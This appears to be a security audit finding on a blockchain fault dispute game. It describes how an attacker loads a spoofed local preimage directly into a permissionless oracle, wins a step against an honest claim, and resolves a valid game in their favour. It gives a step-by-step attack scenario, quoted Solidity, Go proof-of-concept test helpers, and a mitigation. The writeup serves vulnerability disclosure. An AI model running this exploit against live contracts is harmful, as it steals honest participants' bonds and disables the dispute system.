# Vulnerability details

## Impact

### Background
When the game reaches MAX_DEPTH the last claim in the game can be challanged with a step. If it's an honest challanger's turn in the game, they submit a step transaction with state data that matches the prestate commitment. If the state data indicates that the step requires a local preimage, they need to also call addLocalData before they call Step, so that the data is available for the Mips Step function.

There is however a scenario where a malicious user can cause a game with a valid root to fail (while gaining all bonds) using a loophole in the preimage system:

### attack scenario
1. Assume a game with split depth of 14 and max depth of 50 (as in tests). Assume also the last trusted L2 block is 1000
2. An honest depender submits a game with a correct root claim for block 1010
3. An attacker challanges the claim with false/true claims that lead the game to reach the split depth with the honest defender true claim at some block (say 1005). (since the split depth is even the honest defender is the one making the split-depth claim)
4. The attacker then starts an execution trace game with a false claim, attacking the honest output root at block 1005
5. The attacker uses the cannon program to find the first step in the execution game where one of the local preimages is required (for example L2OutputRoot) for the sake of this example lets say this is trace index 100
6. The attacker leads the execution trace game so that the honest defender makes the final claim (at max depth) exactly on trace index 101 (one after the claim that requires the local preimage). (the honest defender is the one to make the claim at the bottom since max_depth is even).
7. At this point there should be no way to succesfully step against the honest defender. The prestate (trace index 100) is agreed by both sides meaning its correct, and the post state (101) was submitted by the honest defender. In order to step against this claim the attacker needs to submit the correct pre-state stateData but the MIPS output should be different then the game output at 101.
8. Before submitting the Step transaction, the attacker calls oracle.loadLocalData with the LocalPreimageKey.STARTING_OUTPUT_ROOT key (instead of calling the game's addLocalData function). Note that this is what the addLocalData function does internally (for all keys):
```solidity
function addLocalData(uint256 _ident, uint256 _execLeafIdx, uint256 _partOffset) external {
        // INVARIANT: Local data can only be added if the game is currently in progress.
        if (status != GameStatus.IN_PROGRESS) revert GameNotInProgress();

        (Claim starting, Position startingPos, Claim disputed, Position disputedPos) =
            _findStartingAndDisputedOutputs(_execLeafIdx);
        Hash uuid = _computeLocalContext(starting, startingPos, disputed, disputedPos);

        IPreimageOracle oracle = VM.oracle();
        if (_ident == LocalPreimageKey.L1_HEAD_HASH) {
            // Load the L1 head hash
            oracle.loadLocalData(_ident, uuid.raw(), l1Head().raw(), 32, _partOffset);
        } else if (_ident == LocalPreimageKey.STARTING_OUTPUT_ROOT) {
            // Load the starting proposal's output root.
            oracle.loadLocalData(_ident, uuid.raw(), starting.raw(), 32, _partOffset);
        } else if (_ident == LocalPreimageKey.DISPUTED_OUTPUT_ROOT) {
            // Load the disputed proposal's output root
            oracle.loadLocalData(_ident, uuid.raw(), disputed.raw(), 32, _partOffset);
        } else if (_ident == LocalPreimageKey.DISPUTED_L2_BLOCK_NUMBER) {
            // Load the disputed proposal's L2 block number as a big-endian uint64 in the
            // high order 8 bytes of the word.

            // We add the index at depth + 1 to the starting block number to get the disputed L2
            // block number.
            uint256 l2Number = startingOutputRoot.l2BlockNumber + disputedPos.traceIndex(SPLIT_DEPTH) + 1;

            oracle.loadLocalData(_ident, uuid.raw(), bytes32(l2Number << 0xC0), 8, _partOffset);
        } else if (_ident == LocalPreimageKey.CHAIN_ID) {
            // Load the chain ID as a big-endian uint64 in the high order 8 bytes of the word.
            oracle.loadLocalData(_ident, uuid.raw(), bytes32(L2_CHAIN_ID << 0xC0), 8, _partOffset);
        } else {
            revert InvalidLocalIdent();
        }
    }
```
 9. Note that the attacker has all the details to make the call (they can compute the localContext uuid offline since it depends on the leaf starting pos and disputed pos, both known). Internally the call also takes the sender address into account when setting the key (presumably so that each caller to Step will have the MIPS use their own local preimage values), however this also works for the attacker because they will be the ones submitting the step as well.
10. Since the PreimageOracle loadLocalData function is permissionless, the attacker is successful in calling it directly and they do so with a false value for the STARTING_OUTPUT_ROOT
11. The attacker then attacks the honest claim at max_depth with Step (_isAttack=true). In order to reach the correct poststate value (submitted by the honest defender) the MIPS contract relies on having the correct local preimage value when processing the step, but it is spoofed, the MIPS step produces a different poststate. Since the honest defender agrees with the poststate (since they submitted it) the Step as a whole is successful (see Step function logic):
```solidity
bool validStep = VM.step(_stateData, _proof, uuid.raw()) == postState.claim.raw();
bool parentPostAgree = (parentPos.depth() - postState.position.depth()) % 2 == 0;
if (parentPostAgree == validStep) revert ValidStep();

// INVARIANT: A step cannot be made against a claim for a second time.
if (parent.counteredBy != address(0)) revert DuplicateStep();

// Set the parent claim as countered. We do not need to append a new claim to the game;
// instead, we can just set the existing parent as countered.
parent.counteredBy = msg.sender;
```
12. Since the step is successful the attacker can resolve the claims all the way up to the root (when max_duration elapses). Because the game logic is that one uncountered subclaim is enough to counter the parent claim, the root claim (and consequently the entire game) is resolved in favor of the attacker who also gains all the bonds in their game trace.

The implications are that an attacker can practically invalidate any valid game while making a profit from collected bonds, causing both a permanent DOS of the system and financial loss for any honest depender/challanger.


### root cause
The preimageOracle contract enables adding local preimages without any verification of values through the loadLocalData function

func (g *OutputCannonGameHelper) FindFirstPreimageStep(ctx context.Context, outputRootClaim *ClaimHelper, pkey preimage.Key) (*cannon.CannonTraceProviderForTest, common.Hash, uint64) {
	provider, localContext := g.createCannonTraceProvider(ctx, "sequencer", outputRootClaim, challenger.WithPrivKey(TestKey))
	start := uint64(0)

	for offset := uint32(0); ; offset += 4 {
		preimageOpt := utils.PreimageLoad(pkey, offset)
		tti, err := provider.FindStep(ctx, start, preimageOpt)
		if errors.Is(err, io.EOF) {
			continue
		}
		g.Require.NoError(err, "Nir Failed to find step that loads requested preimage")
		start = tti
		break
	}
	if start == 0 {
		g.T.Logf("Nir failed to find the preimage key")
		return provider, localContext, 0
	}
	return provider, localContext, start
}

func (g *OutputCannonGameHelper) GetMoveFunctions(ctx context.Context, targetTraceIndex uint64, provider *cannon.CannonTraceProviderForTest) (Mover, Mover, Stepper) {
	splitDepth := g.SplitDepth(ctx)
	execDepth := g.ExecDepth(ctx)

	honestDude := func(claim *ClaimHelper) *ClaimHelper {
		execClaimPosition, err := claim.Position.RelativeToAncestorAtDepth(splitDepth + 1)
		g.Require.NoError(err)
		newPosition := execClaimPosition.Attack()
		correctParent, _ := provider.Get(ctx, execClaimPosition)
		if correctParent == g.GetClaimValue(ctx, claim.Index) {
			newPosition = execClaimPosition.Defend()
		}
		correct, _ := provider.Get(ctx, newPosition)
		if correctParent == g.GetClaimValue(ctx, claim.Index) {
			return claim.Defend(ctx, correct)
		} else {
			return claim.Attack(ctx, correct)
		}
	}

	bisectTraceIndex := func(claim *ClaimHelper) *ClaimHelper {
		execClaimPosition, err := claim.Position.RelativeToAncestorAtDepth(splitDepth + 1)
		g.Require.NoError(err)

		claimTraceIndex := execClaimPosition.TraceIndex(execDepth).Uint64()
		g.T.Logf("Nir Bisecting: Into targetTraceIndex %v: claimIndex=%v at depth=%v. claimPosition=%v execClaimPosition=%v claimTraceIndex=%v",
			targetTraceIndex, claim.Index, claim.Depth(), claim.Position, execClaimPosition, claimTraceIndex)

		// We always want to position ourselves such that the challenger generates proofs for the targetTraceIndex as prestate
		if execClaimPosition.Depth() == execDepth-1 {
			if execClaimPosition.TraceIndex(execDepth).Uint64() == targetTraceIndex {
				newPosition := execClaimPosition.Attack()
				correct, err := provider.Get(ctx, newPosition)
				g.Require.NoError(err)
				g.T.Logf("Nir Bisecting: Attack correctly for step at newPosition=%v execIndexAtDepth=%v", newPosition, newPosition.TraceIndex(execDepth))
				return claim.Attack(ctx, correct)
			} else if execClaimPosition.TraceIndex(execDepth).Uint64() > targetTraceIndex {
				g.T.Logf("Nir Bisecting: Attack incorrectly for step")
				return claim.Attack(ctx, common.Hash{0xdd})
			} else if execClaimPosition.TraceIndex(execDepth).Uint64()+1 == targetTraceIndex {
				g.T.Logf("Nir Bisecting: Defend incorrectly for step")
				return claim.Defend(ctx, common.Hash{0xcc})
			} else {
				newPosition := execClaimPosition.Defend()
				correct, err := provider.Get(ctx, newPosition)
				g.Require.NoError(err)
				g.T.Logf("Nir Bisecting: Defend correctly for step at newPosition=%v execIndexAtDepth=%v", newPosition, newPosition.TraceIndex(execDepth))
				return claim.Defend(ctx, correct)
			}
		}

		// Attack or Defend depending on whether the claim we're responding to is to the left or right of the trace index
		// Induce the honest challenger to attack or defend depending on whether our new position will be to the left or right of the trace index
		if execClaimPosition.TraceIndex(execDepth).Uint64() < targetTraceIndex && claim.Depth() != splitDepth+1 {
			newPosition := execClaimPosition.Defend()
			if newPosition.TraceIndex(execDepth).Uint64() < targetTraceIndex {
				g.T.Logf("Nir Bisecting: Defend correct. newPosition=%v execIndexAtDepth=%v", newPosition, newPosition.TraceIndex(execDepth))
				correct, err := provider.Get(ctx, newPosition)
				g.Require.NoError(err)
				return claim.Defend(ctx, correct)
			} else {
				g.T.Logf("Nir Bisecting: Defend incorrect. newPosition=%v execIndexAtDepth=%v", newPosition, newPosition.TraceIndex(execDepth))
				return claim.Defend(ctx, common.Hash{0xaa})
			}
		} else {
			newPosition := execClaimPosition.Attack()
			if newPosition.TraceIndex(execDepth).Uint64() < targetTraceIndex {
				g.T.Logf("Nir Bisecting: Attack correct. newPosition=%v execIndexAtDepth=%v", newPosition, newPosition.TraceIndex(execDepth))
				correct, err := provider.Get(ctx, newPosition)
				g.Require.NoError(err)
				return claim.Attack(ctx, correct)
			} else {
				g.T.Logf("Nir Bisecting: Attack incorrect. newPosition=%v execIndexAtDepth=%v", newPosition, newPosition.TraceIndex(execDepth))
				return claim.Attack(ctx, common.Hash{0xbb})
			}
		}
	}

	stepp := func(parentClaimIdx int64) {

		//get the final leaf trace index
		claim := g.getClaim(ctx, parentClaimIdx)
		splitDepth := g.SplitDepth(ctx)
		execDepth := g.ExecDepth(ctx)
		relPos, _ := claim.RelativeToAncestorAtDepth(splitDepth + 1)
		traceInd := relPos.TraceIndex(execDepth)

		//get step data for the prestate claim
		stateData, proofData, preimageData, err := provider.GetStepData(ctx, types.NewPosition(execDepth, traceInd.Sub(traceInd, big.NewInt(1))))
		g.Require.NoError(err)

		//upload a fake preimage and call Step
		//TODO: calc local context
		localContext := common.Hash{0xaa}
		g.UploadFakePreimage(ctx, client.L2OutputRootLocalIndex, localContext, preimageData.GetIdent())

		//call contract Step to invalidate the claim
		g.StepOn(ctx, parentClaimIdx, true, stateData, proofData)

		//should wait for max duration to end here.
		g.ResolveClaim(ctx, parentClaimIdx)
	}
	return bisectTraceIndex, honestDude, stepp
}

func (g *OutputCannonGameHelper) UploadFakePreimage(ctx context.Context, ident preimage.LocalIndexKey, localContext common.Hash, offset *big.Int) {
	oracle := g.oracle(ctx)
	boundOracle, err := bindings.NewPreimageOracle(oracle.Addr(), g.Client)
	g.Require.NoError(err)
	var tx *gethtypes.Transaction

	tx, err = boundOracle.LoadLocalData(g.Opts, new(big.Int).SetInt64(int64(ident)), localContext, common.Hash{0xaa}, new(big.Int).SetInt64(int64(ident)), offset)
	g.Require.NoError(err, "Failed to load preimage part")
	_, err = wait.ForReceiptOK(ctx, g.Client, tx.Hash())
}

func (g *OutputCannonGameHelper) StepOn(ctx context.Context, claimIdx int64, isAttack bool, stateData []byte, proof []byte) error {
	candidate, err := g.Game.StepTx(uint64(claimIdx), isAttack, stateData, proof)
	g.Require.NoError(err, "Failed to create tx candidate")
	_, _, err = transactions.SendTx(ctx, g.Client, candidate, g.PrivKey, transactions.WithReceiptFail())
	return err
}

## Recommended Mitigation Steps
It would make sense to allow local preimages to be added to the PreimageOrace only through the game contract (that can validate the veracity of the values) and not direcly to the oracle.
